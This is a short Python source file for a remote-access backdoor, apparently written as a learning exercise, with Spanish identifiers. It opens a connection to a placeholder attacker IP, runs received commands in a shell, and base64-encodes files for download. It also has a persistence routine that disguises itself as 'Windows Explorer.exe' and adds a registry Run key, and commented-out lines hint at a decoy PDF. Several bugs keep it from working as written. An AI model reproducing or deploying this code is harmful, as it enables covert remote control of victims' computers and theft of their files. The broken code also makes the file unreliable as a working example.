import socket
import subprocess
import json
import os
import base64
import sys 
import shutil


class b4ckd00r:
    def __init__(self, ip, port):
        #self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+ evil_file_location + '"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recive(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
                

    def ejecutar_commando(command):
        return subprocess.check_output(command, shell=True)

    def cambiar_directorio(self, path):
        os.chdir(path)
        return "[+] Cambiando directorio a " + path
 
    def leer_archivos(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = self.connection.recv()
            if command[0] == "salir":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                resultados_comando = self.cambiar_directorio(command[1])
            elif command[0] == "descargar":
                resultados_comando = self.leer_archivos(command[1])
            else:
             resultados_comando = self.ejecutar_commando(command)
             
            self.connection.send(command.encode())

#file_name = sys._MEIPASS + "\lista.pdf"
#subprocess.Popen(file_name, shell=True)  

try:
 puerta = b4ckd00r("IP MAQUINA ATACANTE ", 4545)
 puerta.run()     
except Exception:
    sys.exit()
